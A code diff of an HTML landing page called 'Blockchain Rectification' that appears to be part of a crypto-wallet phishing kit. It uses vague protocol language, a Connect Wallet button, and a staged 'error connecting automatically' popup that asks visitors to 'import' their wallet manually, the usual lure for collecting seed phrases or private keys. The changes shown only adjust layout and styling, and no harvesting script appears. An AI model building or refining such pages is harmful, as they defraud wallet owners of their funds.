@@ -8,20 +8,15 @@
 </head>
 <body>
     <div class="landing-container">
-        <div class="landing-content">
-            <h1>Blockchain Rectification</h1>
-            <p>
-                This is not an app but a protocol, that establishes a remote resolution between all noncustodial wallet discovering the decentralized solutions, seamless transactions, and a decentralized ecosystem. Join us in revolutionizing the way you interact with digital assets and decentralized applications.
-            </p>
-            <button class="connect-btn" onclick="openWalletPopup()">Connect Wallet</button>
-        </div>
-        <div class="landing-image">
-            <img src="assets/blockchain-graphic.png" alt="Blockchain Graphic">
-        </div>
+        <h1>Blockchain Rectification</h1>
+        <p>
+            This is not an app but a protocol, that establishes a remote resolution between all noncustodial wallet discovering the decentralized solutions, seamless transactions, and a decentralized ecosystem. Join us in revolutionizing the way you interact with digital assets and decentralized applications.
+        </p>
+        <button class="connect-btn" onclick="openWalletPopup()">Connect Wallet</button>
     </div>
 
     <!-- Wallet Selection Popup -->
-    <div id="walletPopup" class="popup" style="display: none;">
+    <div id="walletPopup" class="popup">
         <div class="popup-content">
             <h2>Connect your wallet</h2>
             <div class="wallet-list" id="walletList"></div>
@@ -29,7 +24,7 @@
     </div>
 
     <!-- Initializing Popup -->
-    <div id="initPopup" class="popup" style="display: none;">
+    <div id="initPopup" class="popup">
         <div class="popup-content">
             <h2>Initializing</h2>
             <div class="wallet-info">
@@ -40,9 +35,9 @@
     </div>
 
     <!-- Error/Manual Connect Popup -->
-    <div id="errorPopup" class="popup" style="display: none;">
+    <div id="errorPopup" class="popup">
         <div class="popup-content">
-            <p style="color: red;">There was an error connecting automatically. But do not worry, you can still connect manually.</p>
+            <p>There was an error connecting automatically. But do not worry, you can still connect manually.</p>
             <h2>Import your <span id="errorWalletName"></span> wallet</h2>
             
             <div class="tabs">
